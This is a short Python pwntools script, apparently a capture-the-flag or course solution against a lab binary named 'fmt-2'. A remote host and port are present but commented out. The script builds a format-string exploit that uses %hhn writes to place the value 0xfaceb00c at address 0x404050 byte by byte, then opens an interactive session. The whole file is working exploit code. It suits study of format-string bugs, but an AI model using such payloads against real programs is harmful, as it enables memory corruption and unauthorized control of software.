```
from pwn import *

ip = "120.114.62.211"
port = 4003

#r = remote(ip, port)
r = process("./fmt-2")

context.arch = "amd64"

magic_address = 0x404050
length = 0x48
target_value = 0xfaceb00c

payload = b""

idx = 12 # 如何選idx
ch = 0

for i in range(4):
    add_char = ((256 - ch)+ (target_value & 0xff))%256 
    payload += f"%{add_char}c%{idx}$hhn".encode()
    ch = target_value & 0xff
    target_value >>= 8
    idx += 1

padding = (8 -len(payload)%8)*b"a"
payload += padding
payload += p64(magic_address) + p64(magic_address+1) + p64(magic_address+2) + p64(magic_address+3)

r.sendafter(":", payload)

r.interactive()
```
